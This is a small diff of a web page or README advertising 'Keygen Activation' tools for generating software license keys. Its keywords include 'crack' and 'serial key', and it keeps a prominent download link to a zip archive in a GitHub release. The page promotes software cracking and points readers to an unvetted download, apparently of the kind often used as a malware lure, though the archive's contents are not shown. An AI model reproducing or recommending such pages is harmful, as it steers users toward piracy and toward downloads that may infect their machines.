@@ -1,8 +1,6 @@
 <meta name="description" content="Keygen Activation: Software Key Generator and Activation Tools">
 <meta name="keywords" content="keygen, key generator, activation, software activation, license key, serial key, crack, activation tool, software key, registration key">
 
-<h1>Keygen Activation: Your Key to Software Activation</h1>
-
 <p dir="ltr"><img src="placeholder_keygen.jpg" alt="Keygen Activation Software" style="max-width: 100%;"></p> <!-- Replace with a relevant image -->
 
 # [Download LINK](https://github.com/sashido19/Keygen-Activation/releases/download/2/Keygen.Activation.zip)
